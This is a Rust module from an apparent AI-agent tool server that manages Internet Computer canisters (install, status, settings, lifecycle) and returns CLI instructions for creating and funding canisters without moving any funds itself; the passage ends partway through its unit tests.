//! Canister management as the connection's **management identity** — the
//! user's default account at this server's own origin, a stable per-user
//! controller (derived on demand like any per-app account).
//!
//! One on-chain surface is used: the **management canister** (`aaaaa-aa`) for
//! the canister lifecycle — `install_code` (single-shot or chunked),
//! `canister_status`, `update_settings`, `start`/`stop`/`uninstall`/`delete`.
//! Every call sets the ic-agent **effective canister id** to the *target*
//! canister (not `aaaaa-aa`), as the boundary node requires, and is signed by
//! a controller (the management identity).
//!
//! **Creation and top-ups are instructions-only.** Creating or topping up a
//! canister spends the user's ICP or cycles, so `icp_create_canister` and
//! `icp_top_up_canister` deliberately execute nothing: each returns the icp
//! CLI steps for the user to run themselves (see
//! [`create_canister_instructions`] / [`top_up_instructions`]). The tools
//! exist to reflect the platform capability; this server does not create
//! canisters or move cycles or ICP. The creation steps include adding the
//! management principal (printed by `icp_cycles_balance`) as a controller, so
//! the lifecycle tools here can operate a canister the user created.
//!
//! Compiling Motoko/Rust to Wasm happens in the agent's own environment (guided
//! by the IC skills); these tools take the already-built Wasm and put it on
//! chain.

use base64::Engine;
use candid::{types::value::IDLArgs, CandidType, Decode, Encode, Nat, Principal};
use ic_agent::{Agent, Identity};
// rmcp re-exports schemars 1.x; the `#[tool]` macro requires THAT version's
// `JsonSchema` (not the top-level schemars 0.8 dep), so derive against it.
use rmcp::schemars;
use serde::{Deserialize, Serialize};

use crate::identities::Identities;

/// Cycles ledger — read for `icp_cycles_balance`.
const CYCLES_LEDGER: &str = "um5iw-rqaaa-aaaaq-qaaba-cai";
/// 1 ICP = 100_000_000 e8s.
const E8S_PER_ICP: u64 = 100_000_000;
/// Above this, install via the chunk store rather than a single ingress message
/// (the ingress arg limit is ~2 MiB and must also hold the mode/id/arg).
const MAX_SINGLE_SHOT_WASM: usize = 1_900_000;
/// Chunk size for chunked installs (the management chunk store caps a chunk at 1 MiB).
const CHUNK_SIZE: usize = 1_000_000;

// ===========================================================================
// MCP-facing argument structs (textual in, textual out — the LLM never touches
// binary Candid). One per tool; the `#[tool]` wrappers in main.rs pass these in.
// ===========================================================================

#[derive(Debug, serde::Deserialize, schemars::JsonSchema)]
pub struct CreateCanisterArgs {
    /// Intended cycle amount to fund the new canister with. OPTIONAL and
    /// informational only: it is substituted into the printed CLI commands so
    /// the user can copy-paste them; no cycles are moved by this tool.
    #[serde(default)]
    pub cycles: Option<u64>,
    /// Intended ICP amount to convert into the new canister's cycles, as a
    /// decimal string e.g. "0.5". OPTIONAL and informational only: substituted
    /// into the printed CLI commands; no ICP is moved by this tool.
    #[serde(default)]
    pub icp: Option<String>,
}

#[derive(Debug, serde::Deserialize, schemars::JsonSchema)]
pub struct TopUpArgs {
    /// Canister to top up. Echoed into the returned CLI instructions; nothing is
    /// executed against it.
    pub canister_id: String,
    /// Intended cycle amount. OPTIONAL and informational only: it is substituted
    /// into the printed CLI commands so the user can copy-paste them; no cycles
    /// are moved by this tool.
    #[serde(default)]
    pub cycles: Option<u64>,
    /// Intended ICP amount to convert into cycles, as a decimal string. OPTIONAL
    /// and informational only: substituted into the printed CLI commands; no ICP
    /// is moved by this tool.
    #[serde(default)]
    pub icp: Option<String>,
}

#[derive(Debug, serde::Deserialize, schemars::JsonSchema)]
pub struct InstallCodeArgs {
    /// Target canister.
    pub canister_id: String,
    /// The compiled Wasm module, base64-encoded. Use `wasm_hex` for hex instead.
    #[serde(default)]
    pub wasm_base64: Option<String>,
    /// The compiled Wasm module, hex-encoded. Alternative to `wasm_base64`.
    #[serde(default)]
    pub wasm_hex: Option<String>,
    /// "install" (default — canister must be empty), "reinstall" (wipe + install),
    /// or "upgrade" (preserve stable memory).
    #[serde(default = "default_install_mode")]
    pub mode: String,
    /// Init/upgrade argument as textual Candid, e.g. "()" or "(record { … })".
    #[serde(default = "default_init_arg")]
    pub arg: String,
}

#[derive(Debug, serde::Deserialize, schemars::JsonSchema)]
pub struct CanisterRefArgs {
    /// Target canister.
    pub canister_id: String,
}

#[derive(Debug, serde::Deserialize, schemars::JsonSchema)]
pub struct UpdateSettingsArgs {
    /// Target canister.
    pub canister_id: String,
    /// REPLACE the controller set. Include your own principal to stay a controller.
    #[serde(default)]
    pub controllers: Option<Vec<String>>,
    /// Compute allocation, 0..=100 (percent of a core reserved).
    #[serde(default)]
    pub compute_allocation: Option<u64>,
    /// Memory allocation in bytes (0 = best-effort).
    #[serde(default)]
    pub memory_allocation: Option<u64>,
    /// Freezing threshold in seconds.
    #[serde(default)]
    pub freezing_threshold: Option<u64>,
    /// Reserved-cycles limit.
    #[serde(default)]
    pub reserved_cycles_limit: Option<u64>,
    /// Wasm heap memory limit in bytes.
    #[serde(default)]
    pub wasm_memory_limit: Option<u64>,
    /// Log visibility: "controllers" or "public".
    #[serde(default)]
    pub log_visibility: Option<String>,
}

#[derive(Debug, serde::Deserialize, schemars::JsonSchema)]
pub struct NoArgs {}

// ===========================================================================
// Structured tool outputs (declared as each tool's MCP `outputSchema`). The
// same data is also rendered to human-readable text via `human()`.
// ===========================================================================

/// Structured result of the lifecycle/action tools that confirm an operation on
/// a specific canister (`icp_canister_status`, `icp_install_code`,
/// `icp_update_canister_settings`, `icp_start_canister`,
/// `icp_stop_canister`, `icp_uninstall_code`, `icp_delete_canister`).
#[derive(Debug, Serialize, schemars::JsonSchema)]
pub struct CanisterActionOutput {
    /// The canister the action targeted.
    pub canister_id: String,
    /// Human-readable summary of the outcome (same as the text content).
    pub message: String,
}

/// Structured result of `icp_top_up_canister` — CLI instructions, never an
/// executed operation. The tool reflects a platform capability for
/// completeness, but the server does not move cycles or ICP on the user's
/// behalf; the user runs the printed commands themselves.
#[derive(Debug, Serialize, schemars::JsonSchema)]
pub struct TopUpInstructions {
    /// The canister the instructions are for (canonical principal text).
    pub canister_id: String,
    /// Always `false`: this tool executes nothing and moves no funds.
    pub executed: bool,
    /// Step-by-step CLI instructions for the user to run the top-up themselves.
    pub instructions: String,
}

impl TopUpInstructions {
    pub fn human(&self) -> String {
        self.instructions.clone()
    }
}

/// Structured result of `icp_cycles_balance`.
#[derive(Debug, Serialize, schemars::JsonSchema)]
pub struct CyclesBalance {
    /// Your Internet Identity principal — the cycles-ledger account owner.
    pub principal: String,
    /// Balance in cycles, as a decimal string (cycle counts can exceed u64).
    pub balance: String,
}

impl CyclesBalance {
    pub fn human(&self) -> String {
        format!(
            "Your cycles-ledger balance (principal {}): {} cycles.",
            self.principal, self.balance
        )
    }
}

/// Structured result of `icp_create_canister` — CLI instructions, never an
/// executed operation. Like `icp_top_up_canister`, the tool reflects a
/// platform capability for completeness, but the server does not create
/// canisters or move cycles or ICP on the user's behalf; the user runs the
/// printed commands themselves.
#[derive(Debug, Serialize, schemars::JsonSchema)]
pub struct CreateCanisterInstructions {
    /// Always `false`: this tool executes nothing and moves no funds.
    pub executed: bool,
    /// Step-by-step CLI instructions for the user to create, fund, and (for
    /// connector management) re-controller the canister themselves.
    pub instructions: String,
}

impl CreateCanisterInstructions {
    pub fn human(&self) -> String {
        self.instructions.clone()
    }
}

fn default_install_mode() -> String {
    "install".to_string()
}
fn default_init_arg() -> String {
    "()".to_string()
}

// ===========================================================================
// Tool implementations. Each takes &Identities + session_id so the logic is
// testable without an IcTools and main.rs stays thin.
// ===========================================================================

/// Your cycles-ledger balance, and the management principal itself — the
/// principal to add as a controller (via the icp CLI) so the management tools
/// here can operate a canister the user created.
pub async fn cycles_balance(ids: &Identities, session_id: &str) -> Result<CyclesBalance, String> {
    let (agent, principal) = management_agent(ids, session_id).await?;
    let ledger = parse_principal(CYCLES_LEDGER)?;
    let account = Account {
        owner: principal,
        subaccount: None,
    };
    let arg = Encode!(&account).map_err(|e| format!("encode account: {e}"))?;
    let reply = agent
        .query(&ledger, "icrc1_balance_of")
        .with_arg(arg)
        .call()
        .await
        .map_err(|e| format!("icrc1_balance_of failed: {e}"))?;
    let balance = Decode!(&reply, Nat).map_err(|e| format!("decode balance: {e}"))?;
    Ok(CyclesBalance {
        principal: principal.to_text(),
        balance: balance.to_string(),
    })
}

/// Build the CLI instructions `icp_create_canister` returns. Deliberately
/// executes nothing: no identity, no session, no canister call — creating and
/// funding a canister spends the user's ICP or cycles, so the operation is the
/// user's to run, in their own terminal, with a CLI and keys they control
/// (exactly like [`top_up_instructions`]). The optional amounts are echoed
/// into the printed commands after the same validation the old executing path
/// used, so junk is rejected rather than printed.
pub fn create_canister_instructions(
    args: CreateCanisterArgs,
) -> Result<CreateCanisterInstructions, String> {
    let cycles = match args.cycles {
        Some(0) => return Err("cycles amount must be greater than 0".into()),
        Some(c) => c.to_string(),
        None => "<CYCLES>".to_string(),
    };
    let icp = match args.icp.as_deref().map(str::trim).filter(|s| !s.is_empty()) {
        Some(s) => {
            parse_icp_e8s_positive(s)?;
            s.to_string()
        }
        None => "<ICP_AMOUNT>".to_string(),
    };
    let instructions = format!(
        "No canister was created and no funds were moved: this server does not \
         create or fund canisters on your behalf. This tool exists for \
         completeness — creating canisters is an Internet Computer platform \
         capability — but the operation itself is yours to run, from your own \
         terminal, with the icp CLI:\n\
         \n\
         \x20 1. Get the icp CLI (if needed):       npm install -g @icp-sdk/icp-cli\n\
         \x20    (Node.js >= 22; other installers: https://github.com/dfinity/icp-cli/releases)\n\
         \x20 2. Check your cycles-ledger balance:  icp cycles balance -n ic\n\
         \x20 3. (If needed) convert ICP to cycles: icp cycles mint --icp {icp} -n ic\n\
         \x20 4. Create and fund the canister:      icp canister create <NAME> -e ic --cycles {cycles}\n\
         \x20 5. (Optional) to let this connector manage the new canister\n\
         \x20    (icp_install_code, status, lifecycle), add your management\n\
         \x20    principal — printed by icp_cycles_balance — as a controller:\n\
         \x20                                       icp canister settings update <NAME> --add-controller <PRINCIPAL> -e ic\n\
         \n\
         For the full creation & funding guide, load the official \
         cycles-management skill (icp_get_skill with name \"cycles-management\")."
    );
    Ok(CreateCanisterInstructions {
        executed: false,
        instructions,
    })
}

/// Build the CLI instructions `icp_top_up_canister` returns. Deliberately
/// executes nothing: no identity, no session, no canister call. The tool
/// reflects the platform capability (canisters are topped up with cycles) for
/// completeness, but the operation itself is the user's to run, in their own
/// terminal, with a CLI and keys they control.
pub fn top_up_instructions(args: TopUpArgs) -> Result<TopUpInstructions, String> {
    // Validate + canonicalize the id so the printed commands are copy-pastable.
    let target = parse_principal(&args.canister_id)?;
    // Substitute intended amounts into the commands where given; otherwise leave
    // shell-style placeholders for the user to fill in. Given amounts go through
    // the same validators the executing path used: the values are echoed into
    // commands advertised as copy-pastable, so junk — a zero, a non-numeric
    // string, anything smuggling shell input — is rejected, never printed. (A
    // validated `icp` is digits with at most one dot, so it is inert in a shell.)
    let cycles = match args.cycles {
        Some(0) => return Err("cycles amount must be greater than 0".into()),
        Some(c) => c.to_string(),
        None => "<CYCLES>".to_string(),
    };
    let icp = match args.icp.as_deref().map(str::trim).filter(|s| !s.is_empty()) {
        Some(s) => {
            parse_icp_e8s_positive(s)?;
            s.to_string()
        }
        None => "<ICP_AMOUNT>".to_string(),
    };
    let instructions = format!(
        "No top-up was performed and no funds were moved: this server does not \
         execute top-ups on your behalf. This \
         tool exists for completeness — topping up canisters is an Internet \
         Computer platform capability — but the operation itself is yours to run, \
         from your own terminal, with the icp CLI:\n\
         \n\
         \x20 1. Get the icp CLI (if needed):       npm install -g @icp-sdk/icp-cli\n\
         \x20    (Node.js >= 22; other installers: https://github.com/dfinity/icp-cli/releases)\n\
         \x20 2. Check your cycles-ledger balance:  icp cycles balance -n ic\n\
         \x20 3. (If needed) convert ICP to cycles: icp cycles mint --icp {icp} -n ic\n\
         \x20 4. Deposit cycles onto the canister:  icp canister top-up {target} --amount {cycles} -e ic\n\
         \x20    (--amount accepts k/m/b/t suffixes, e.g. --amount 600b)\n\
         \n\
         For the full funding guide, load the official cycles-management skill \
         (icp_get_skill with name \"cycles-management\")."
    );
    Ok(TopUpInstructions {
        canister_id: target.to_text(),
        executed: false,
        instructions,
    })
}

/// Install (or reinstall/upgrade) a Wasm module on a canister you control.
pub async fn install_code(
    ids: &Identities,
    session_id: &str,
    args: InstallCodeArgs,
) -> Result<String, String> {
    ids.require_write(session_id).await?;
    let target = parse_principal(&args.canister_id)?;
    let wasm = decode_wasm(&args)?;
    if wasm.is_empty() {
        return Err("the Wasm module is empty".into());
    }
    let mode = parse_mode(&args.mode)?;
    let init_arg = encode_textual_arg(&args.arg)?;
    let (agent, _) = management_agent(ids, session_id).await?;

    if wasm.len() <= MAX_SINGLE_SHOT_WASM {
        let install = InstallCodeArg {
            mode,
            canister_id: target,
            wasm_module: wasm.clone(),
            arg: init_arg,
            sender_canister_version: None,
        };
        let bytes = Encode!(&install).map_err(|e| format!("encode install_code: {e}"))?;
        mgmt_call(&agent, target, "install_code", bytes).await?;
        Ok(format!(
            "Installed {}-byte module on {target} (mode {}).",
            wasm.len(),
            args.mode
        ))
    } else {
        let chunks = wasm.len().div_ceil(CHUNK_SIZE);
        install_chunked(&agent, target, mode, &wasm, init_arg).await?;
        Ok(format!(
            "Installed {}-byte module on {target} via {chunks} chunks (mode {}).",
            wasm.len(),
            args.mode
        ))
    }
}

/// Report a canister's status (cycles, module hash, memory, settings).
pub async fn canister_status(
    ids: &Identities,
    session_id: &str,
    args: CanisterRefArgs,
) -> Result<String, String> {
    // canister_status is an UPDATE call (controller-gated), so a read-only
    // session can't make it — fail early with an actionable message (H2).
    ids.require_write(session_id).await?;
    let target = parse_principal(&args.canister_id)?;
    let (agent, _) = management_agent(ids, session_id).await?;
    let arg = Encode!(&CanisterIdRecord {
        canister_id: target
    })
    .map_err(|e| format!("encode: {e}"))?;
    // canister_status is an UPDATE call (controller-gated), not a query.
    let bytes = mgmt_call(&agent, target, "canister_status", arg).await?;
    Ok(format_status(target, &bytes))
}

/// Update a canister's settings (controllers / allocations / freezing / logs).
pub async fn update_canister_settings(
    ids: &Identities,
    session_id: &str,
    args: UpdateSettingsArgs,
) -> Result<String, String> {
    ids.require_write(session_id).await?;
    let target = parse_principal(&args.canister_id)?;
    let mut settings = CanisterSettings::default();
    if let Some(cs) = &args.controllers {
        settings.controllers = Some(
            cs.iter()
                .map(|c| parse_principal(c))
                .collect::<Result<Vec<_>, _>>()?,
        );
    }
    settings.compute_allocation = args.compute_allocation.map(Nat::from);
    settings.memory_allocation = args.memory_allocation.map(Nat::from);
    settings.freezing_threshold = args.freezing_threshold.map(Nat::from);
    settings.reserved_cycles_limit = args.reserved_cycles_limit.map(Nat::from);
    settings.wasm_memory_limit = args.wasm_memory_limit.map(Nat::from);
    if let Some(lv) = &args.log_visibility {
        settings.log_visibility = Some(parse_log_visibility(lv)?);
    }

    let (agent, _) = management_agent(ids, session_id).await?;
    let arg = Encode!(&UpdateSettingsArg {
        canister_id: target,
        settings,
        sender_canister_version: None,
    })
    .map_err(|e| format!("encode update_settings: {e}"))?;
    mgmt_call(&agent, target, "update_settings", arg).await?;
    Ok(format!("Updated settings of {target}."))
}

/// Start a stopped canister.
pub async fn start_canister(ids: &Identities, sid: &str, canister_id: &str) -> Result<String, String> {
    lifecycle(ids, sid, canister_id, "start_canister").await?;
    Ok(format!("Started {canister_id}."))
}

/// Stop a running canister (required before deletion).
pub async fn stop_canister(ids: &Identities, sid: &str, canister_id: &str) -> Result<String, String> {
    lifecycle(ids, sid, canister_id, "stop_canister").await?;
    Ok(format!("Stopped {canister_id}."))
}

/// Remove a canister's code and state, leaving it empty.
pub async fn uninstall_code(ids: &Identities, sid: &str, canister_id: &str) -> Result<String, String> {
    lifecycle(ids, sid, canister_id, "uninstall_code").await?;
    Ok(format!("Uninstalled code from {canister_id}."))
}

/// Delete a stopped canister permanently (irreversible).
pub async fn delete_canister(ids: &Identities, sid: &str, canister_id: &str) -> Result<String, String> {
    lifecycle(ids, sid, canister_id, "delete_canister").await?;
    Ok(format!(
        "Deleted {canister_id}. (Its remaining cycles are burned; this is irreversible.)"
    ))
}

// ===========================================================================
// Internal helpers
// ===========================================================================

/// Build an ic-agent backed by the connection's stable management identity (the
/// user's default account at this server's own origin), plus that identity's
/// principal (the default controller/funder).
async fn management_agent(ids: &Identities, session_id: &str) -> Result<(Agent, Principal), String> {
    let identity = ids.management_identity(session_id).await?;
    let principal = identity
        .sender()
        .map_err(|e| format!("could not derive your principal: {e}"))?;
    // A clone of the injected base agent with the management identity swapped
    // in — same boundary-node routing as every other call.
    let agent = ids.agent_as(identity);
    Ok((agent, principal))
}

/// A management-canister (`aaaaa-aa`) update call with the effective canister id
/// set to the TARGET — the boundary node requires this for lifecycle methods.
///
/// NOTE — these writes do NOT go through the service-discoverability gate that
/// `canister_update_call` runs (see [`crate::discoverability`]). That is correct
/// as things stand: these tools act on the USER'S OWN canisters as their
/// management principal, not on a third party's app, and an app manifest has
/// nothing to say about them. It is also currently moot — [`crate::IcProtocolTools`]
/// is not part of the served composition. If that group is ever composed back
/// in, revisit whether any of it can reach a canister the user does not control;
/// the gate's premise is that a write to someone else's app needs that app's
/// published consent.
async fn mgmt_call(
    agent: &Agent,
    target: Principal,
    method: &str,
    arg: Vec<u8>,
) -> Result<Vec<u8>, String> {
    agent
        .update(&Principal::management_canister(), method)
        .with_effective_canister_id(target)
        .with_arg(arg)
        .call_and_wait()
        .await
        .map_err(|e| format!("{method} failed: {e}"))
}

/// Shared body for the no-payload lifecycle methods (all UPDATE calls).
async fn lifecycle(
    ids: &Identities,
    session_id: &str,
    canister_id: &str,
    method: &str,
) -> Result<(), String> {
    ids.require_write(session_id).await?;
    let target = parse_principal(canister_id)?;
    let (agent, _) = management_agent(ids, session_id).await?;
    let arg = Encode!(&CanisterIdRecord {
        canister_id: target
    })
    .map_err(|e| format!("encode: {e}"))?;
    mgmt_call(&agent, target, method, arg).await?;
    Ok(())
}

/// Upload the Wasm to the target's chunk store and install via `install_chunked_code`.
async fn install_chunked(
    agent: &Agent,
    target: Principal,
    mode: CanisterInstallMode,
    wasm: &[u8],
    arg: Vec<u8>,
) -> Result<(), String> {
    // Start from a clean store so a previous partial upload can't leak in.
    let clear = Encode!(&CanisterIdRecord {
        canister_id: target
    })
    .map_err(|e| format!("encode clear_chunk_store: {e}"))?;
    mgmt_call(agent, target, "clear_chunk_store", clear).await?;

    let mut hashes: Vec<ChunkHash> = Vec::new();
    for chunk in wasm.chunks(CHUNK_SIZE) {
        let up = Encode!(&UploadChunkArg {
            canister_id: target,
            chunk: chunk.to_vec(),
        })
        .map_err(|e| format!("encode upload_chunk: {e}"))?;
        let reply = mgmt_call(agent, target, "upload_chunk", up).await?;
        let h = Decode!(&reply, ChunkHash).map_err(|e| format!("decode chunk hash: {e}"))?;
        hashes.push(h);
    }

    let install = InstallChunkedCodeArg {
        mode,
        target_canister: target,
        store_canister: None,
        chunk_hashes_list: hashes,
        wasm_module_hash: sha256(wasm),
        arg,
        sender_canister_version: None,
    };
    let bytes = Encode!(&install).map_err(|e| format!("encode install_chunked_code: {e}"))?;
    mgmt_call(agent, target, "install_chunked_code", bytes).await?;
    Ok(())
}

/// Parse a decimal-ICP string and require it to be > 0.
fn parse_icp_e8s_positive(icp: &str) -> Result<u64, String> {
    let e8s = parse_icp_to_e8s(icp)?;
    if e8s == 0 {
        return Err("ICP amount must be greater than 0".into());
    }
    Ok(e8s)
}


/// Parse a decimal-ICP string ("0.5", "2", ".25") into e8s, rejecting >8 decimals.
fn parse_icp_to_e8s(s: &str) -> Result<u64, String> {
    let s = s.trim();
    let (int_part, frac_part) = match s.split_once('.') {
        Some((i, f)) => (i, f),
        None => (s, ""),
    };
    if int_part.is_empty() && frac_part.is_empty() {
        return Err(format!("invalid ICP amount `{s}`"));
    }
    if frac_part.len() > 8 {
        return Err("ICP amount has at most 8 decimal places".into());
    }
    let int_val: u64 = if int_part.is_empty() {
        0
    } else {
        int_part
            .parse()
            .map_err(|_| format!("invalid ICP amount `{s}`"))?
    };
    let frac_val: u64 = if frac_part.is_empty() {
        0
    } else {
        // Pad the fractional digits out to 8 places (e8s).
        format!("{frac_part:0<8}")
            .parse()
            .map_err(|_| format!("invalid ICP amount `{s}`"))?
    };
    int_val
        .checked_mul(E8S_PER_ICP)
        .and_then(|v| v.checked_add(frac_val))
        .ok_or_else(|| "ICP amount too large".into())
}

fn decode_wasm(args: &InstallCodeArgs) -> Result<Vec<u8>, String> {
    if let Some(b64) = args.wasm_base64.as_deref().map(str::trim).filter(|s| !s.is_empty()) {
        return base64::engine::general_purpose::STANDARD
            .decode(b64)
            .map_err(|e| format!("invalid base64 wasm: {e}"));
    }
    if let Some(h) = args.wasm_hex.as_deref().map(str::trim).filter(|s| !s.is_empty()) {
        return hex::decode(h).map_err(|e| format!("invalid hex wasm: {e}"));
    }
    Err("provide the compiled Wasm as `wasm_base64` or `wasm_hex`".into())
}

fn parse_mode(s: &str) -> Result<CanisterInstallMode, String> {
    match s.trim().to_lowercase().as_str() {
        "install" => Ok(CanisterInstallMode::Install),
        "reinstall" => Ok(CanisterInstallMode::Reinstall),
        "upgrade" => Ok(CanisterInstallMode::Upgrade(None)),
        other => Err(format!(
            "invalid install mode `{other}` (use install|reinstall|upgrade)"
        )),
    }
}

fn parse_log_visibility(s: &str) -> Result<LogVisibility, String> {
    match s.trim().to_lowercase().as_str() {
        "controllers" => Ok(LogVisibility::Controllers),
        "public" => Ok(LogVisibility::Public),
        other => Err(format!(
            "invalid log_visibility `{other}` (use controllers|public)"
        )),
    }
}

/// Encode a textual-Candid init/upgrade argument type-lessly (there is no
/// service interface to coerce against at install time).
fn encode_textual_arg(arg: &str) -> Result<Vec<u8>, String> {
    // Bound size/nesting before parsing so untrusted input can't stack-overflow
    // the process (CWE-674).
    crate::calls::guard_candid_text("the install `arg`", arg)?;
    crate::calls::on_deep_stack(|| {
        candid_parser::parse_idl_args(arg)
            .map_err(|e| format!("could not parse init arg `{arg}`: {e}"))?
            .to_bytes()
            .map_err(|e| format!("could not encode init arg: {e}"))
    })
    .unwrap_or_else(|| Err("could not spawn a thread to parse the install `arg`".into()))
}

fn parse_principal(s: &str) -> Result<Principal, String> {
    Principal::from_text(s.trim()).map_err(|e| format!("invalid principal `{s}`: {e}"))
}

fn sha256(data: &[u8]) -> Vec<u8> {
    use sha2::{Digest, Sha256};
    let mut h = Sha256::new();
    h.update(data);
    h.finalize().to_vec()
}

/// Pretty-print a `canister_status` reply, falling back to a raw Candid dump if
/// the live record carries a shape we don't model.
fn format_status(target: Principal, bytes: &[u8]) -> String {
    match Decode!(bytes, CanisterStatusResult) {
        Ok(s) => {
            let status = match s.status {
                CanisterRunStatus::Running => "running",
                CanisterRunStatus::Stopping => "stopping",
                CanisterRunStatus::Stopped => "stopped",
            };
            let module_hash = s
                .module_hash
                .map(|h| hex::encode(h))
                .unwrap_or_else(|| "(none — empty canister)".into());
            let controllers = s
                .settings
                .controllers
                .iter()
                .map(Principal::to_text)
                .collect::<Vec<_>>()
                .join(", ");
            format!(
                "Canister {target}\n\
                 - status: {status}\n\
                 - cycles: {}\n\
                 - module hash: {module_hash}\n\
                 - memory size: {} bytes\n\
                 - idle burn/day: {} cycles\n\
                 - reserved cycles: {}\n\
                 - controllers: {controllers}\n\
                 - compute allocation: {}\n\
                 - memory allocation: {}\n\
                 - freezing threshold: {} s",
                s.cycles,
                s.memory_size,
                s.idle_cycles_burned_per_day,
                s.reserved_cycles,
                s.settings.compute_allocation,
                s.settings.memory_allocation,
                s.settings.freezing_threshold,
            )
        }
        // Defense in depth (CWE-674): this reply is the management canister's own
        // `canister_status` record (a trusted, bounded shape), not the target
        // canister's arbitrary output, but the type-less fallback still runs candid's
        // unbounded decode + `Display` + recursive `Drop`, so bound it on the deep
        // stack like every other reply decode rather than on the ~2 MiB worker stack.
        Err(_) => crate::calls::on_deep_stack(move || match IDLArgs::from_bytes(bytes) {
            Ok(d) => format!("Canister {target} status (raw Candid):\n{d}"),
            Err(e) => format!("canister_status succeeded but the reply didn't decode: {e}"),
        })
        .unwrap_or_else(|| {
            "canister_status succeeded but the reply could not be decoded (no parse thread)"
                .to_string()
        }),
    }
}

// ===========================================================================
// Candid wire types for the system canisters (hand-rolled; more robust than
// threading .did text). Variant labels are renamed to match each canister's
// interface; only fields we set are included on encode (omitted opt fields
// decode as null), and decode structs are kept to long-stable fields.
// ===========================================================================

// ---- Cycles ledger ----

#[derive(CandidType, Deserialize)]
struct Account {
    owner: Principal,
    subaccount: Option<Vec<u8>>,
}

// ---- Shared settings (subset valid for both the cycles ledger and the
//      management canister `canister_settings`; only set fields are encoded) ----

#[derive(CandidType, Default)]
struct CanisterSettings {
    controllers: Option<Vec<Principal>>,
    compute_allocation: Option<Nat>,
    memory_allocation: Option<Nat>,
    freezing_threshold: Option<Nat>,
    reserved_cycles_limit: Option<Nat>,
    wasm_memory_limit: Option<Nat>,
    log_visibility: Option<LogVisibility>,
}

#[derive(CandidType, Deserialize)]
enum LogVisibility {
    #[serde(rename = "controllers")]
    Controllers,
    #[serde(rename = "public")]
    Public,
    #[serde(rename = "allowed_viewers")]
    AllowedViewers(Vec<Principal>),
}

// ---- Management canister (aaaaa-aa) ----

#[derive(CandidType, Deserialize)]
enum CanisterInstallMode {
    #[serde(rename = "install")]
    Install,
    #[serde(rename = "reinstall")]
    Reinstall,
    #[serde(rename = "upgrade")]
    Upgrade(Option<UpgradeOpts>),
}

#[derive(CandidType, Deserialize, Default)]
struct UpgradeOpts {
    skip_pre_upgrade: Option<bool>,
    wasm_memory_persistence: Option<WasmMemoryPersistence>,
}

#[derive(CandidType, Deserialize)]
enum WasmMemoryPersistence {
    #[serde(rename = "keep")]
    Keep,
    #[serde(rename = "replace")]
    Replace,
}

#[derive(CandidType)]
struct InstallCodeArg {
    mode: CanisterInstallMode,
    canister_id: Principal,
    wasm_module: Vec<u8>,
    arg: Vec<u8>,
    sender_canister_version: Option<u64>,
}

#[derive(CandidType)]
struct CanisterIdRecord {
    canister_id: Principal,
}

#[derive(CandidType)]
struct UpdateSettingsArg {
    canister_id: Principal,
    settings: CanisterSettings,
    sender_canister_version: Option<u64>,
}

#[derive(CandidType, Deserialize, Clone)]
struct ChunkHash {
    hash: Vec<u8>,
}

#[derive(CandidType)]
struct UploadChunkArg {
    canister_id: Principal,
    chunk: Vec<u8>,
}

#[derive(CandidType)]
struct InstallChunkedCodeArg {
    mode: CanisterInstallMode,
    target_canister: Principal,
    store_canister: Option<Principal>,
    chunk_hashes_list: Vec<ChunkHash>,
    wasm_module_hash: Vec<u8>,
    arg: Vec<u8>,
    sender_canister_version: Option<u64>,
}

#[derive(CandidType, Deserialize)]
struct CanisterStatusResult {
    status: CanisterRunStatus,
    settings: DefiniteCanisterSettings,
    module_hash: Option<Vec<u8>>,
    memory_size: Nat,
    cycles: Nat,
    idle_cycles_burned_per_day: Nat,
    reserved_cycles: Nat,
}

#[derive(CandidType, Deserialize)]
enum CanisterRunStatus {
    #[serde(rename = "running")]
    Running,
    #[serde(rename = "stopping")]
    Stopping,
    #[serde(rename = "stopped")]
    Stopped,
}

// Subset of `definite_canister_settings`: the long-stable, always-present
// fields. Extra fields in the live reply (log_visibility, wasm_memory_limit, …)
// are ignored on decode.
#[derive(CandidType, Deserialize)]
struct DefiniteCanisterSettings {
    controllers: Vec<Principal>,
    compute_allocation: Nat,
    memory_allocation: Nat,
    freezing_threshold: Nat,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parses_icp_decimal_strings() {
        assert_eq!(parse_icp_to_e8s("1").unwrap(), 100_000_000);
        assert_eq!(parse_icp_to_e8s("0.5").unwrap(), 50_000_000);
        assert_eq!(parse_icp_to_e8s("2").unwrap(), 200_000_000);
        assert_eq!(parse_icp_to_e8s("0.00000001").unwrap(), 1);
        assert_eq!(parse_icp_to_e8s(".25").unwrap(), 25_000_000);
        assert_eq!(parse_icp_to_e8s("0.05").unwrap(), 5_000_000);
        assert_eq!(parse_icp_to_e8s("3.5").unwrap(), 350_000_000);
    }

    #[test]
    fn rejects_bad_icp_amounts() {
        assert!(parse_icp_to_e8s("0.000000001").is_err()); // 9 decimals
        assert!(parse_icp_to_e8s("abc").is_err());
        assert!(parse_icp_to_e8s("").is_err());
        assert!(parse_icp_to_e8s("-1").is_err());
    }

    #[test]
    fn icp_amount_validator_rejects_zero() {
        assert!(parse_icp_e8s_positive("0").is_err()); // zero ICP rejected
        assert_eq!(parse_icp_e8s_positive("0.5").unwrap(), 50_000_000);
    }

    // icp_create_canister is instructions-only, exactly like the top-up tool:
    // nothing is executed, given amounts are validated then echoed into
    // copy-pastable commands, and the steps include handing the connector's
    // management principal control of the new canister so the lifecycle tools
    // can operate it afterwards.
    #[test]
    fn create_instructions_execute_nothing_and_echo_amounts() {
        let out = create_canister_instructions(CreateCanisterArgs {
            cycles: Some(2_000_000_000_000),
            icp: None,
        })
        .unwrap();
        assert!(!out.executed, "the tool must never create a canister");
        assert!(out.instructions.contains("No canister was created"), "{}", out.instructions);
        assert!(
            out.instructions
                .contains("icp canister create <NAME> -e ic --cycles 2000000000000"),
            "{}",
            out.instructions
        );
        assert!(
            out.instructions.contains("npm install -g @icp-sdk/icp-cli"),
            "{}",
            out.instructions
        );
        // The connector-management handover step: add the management principal
        // (printed by icp_cycles_balance) as a controller.
        assert!(out.instructions.contains("--add-controller"), "{}", out.instructions);
        assert!(out.instructions.contains("icp_cycles_balance"), "{}", out.instructions);
        // No ICP amount given: the conversion line keeps a fill-in placeholder.
        assert!(out.instructions.contains("--icp <ICP_AMOUNT>"), "{}", out.instructions);
    }

    // The echoed amounts are advertised as copy-pastable, so junk is rejected
    // (never printed), exactly as on the old executing path.
    #[test]
    fn create_instructions_validate_amounts() {
        let zero = create_canister_instructions(CreateCanisterArgs {
            cycles: Some(0),
            icp: None,
        })
        .expect_err("zero cycles must be rejected");
        assert!(zero.contains("greater than 0"), "{zero}");
